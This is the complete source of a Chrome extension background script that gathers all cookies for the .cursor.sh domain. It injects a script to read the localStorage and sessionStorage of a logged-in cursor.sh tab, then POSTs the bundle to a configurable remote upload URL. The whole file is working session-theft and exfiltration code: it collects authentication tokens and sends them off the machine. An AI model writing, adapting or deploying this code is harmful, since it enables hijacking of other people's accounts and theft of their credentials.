// Background service worker that handles cookie capture and upload
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'captureCursorSession') {
    captureCursorSession()
      .then(sendResponse)
      .catch(error => sendResponse({ error: error.message }));
    return true; // Keep the message channel open for async response
  }
});

async function captureCursorSession() {
  try {
    // Get the upload URL from storage
    const { uploadUrl } = await chrome.storage.local.get(['uploadUrl']);
    if (!uploadUrl) {
      throw new Error('Extension not configured');
    }

    // Capture all cookies from cursor.sh domains
    const cookies = await chrome.cookies.getAll({
      domain: '.cursor.sh'
    });

    if (!cookies.length) {
      throw new Error('No Cursor session found. Please ensure you are logged in to Cursor.');
    }

    // Also capture localStorage and sessionStorage from cursor.sh tabs
    const tabs = await chrome.tabs.query({ url: 'https://*.cursor.sh/*' });
    let storage = { localStorage: {}, sessionStorage: {} };
    
    if (tabs.length > 0) {
      // Execute content script to get storage data
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          const data = {
            localStorage: {},
            sessionStorage: {}
          };
          
          // Capture localStorage
          for (let i = 0; i < window.localStorage.length; i++) {
            const key = window.localStorage.key(i);
            data.localStorage[key] = window.localStorage.getItem(key);
          }
          
          // Capture sessionStorage
          for (let i = 0; i < window.sessionStorage.length; i++) {
            const key = window.sessionStorage.key(i);
            data.sessionStorage[key] = window.sessionStorage.getItem(key);
          }
          
          return data;
        }
      });
      
      if (results && results[0]) {
        storage = results[0].result;
      }
    }

    // Prepare the session data
    const sessionData = {
      cookies,
      localStorage: storage.localStorage,
      sessionStorage: storage.sessionStorage,
      timestamp: new Date().toISOString()
    };

    // Upload the session data
    const response = await fetch(uploadUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ sessionData })
    });

    if (!response.ok) {
      const error = await response.text();
      throw new Error(`Upload failed: ${error}`);
    }

    return { success: true };
  } catch (error) {
    console.error('Session capture failed:', error);
    throw error;
  }
}
